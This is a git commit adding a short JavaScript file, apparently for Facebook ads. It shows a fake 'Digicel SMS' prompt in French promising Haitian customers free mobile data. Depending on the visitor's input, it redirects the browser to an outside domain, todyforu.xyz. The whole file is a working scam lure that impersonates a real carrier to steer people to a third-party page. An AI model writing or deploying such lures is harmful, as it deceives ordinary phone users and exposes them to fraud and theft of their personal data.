d098d85b30c068551f84dc6e81e2b6339ab646b1
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-06 01:41:35 -0700

    Create fbads-haiti-digicel.js

---
+++ fbads-haiti-digicel.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Digicel SMS: Cher client, veuillez vérifier si votre carte SIM Digicel est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/haiti-digicel.html';
+}
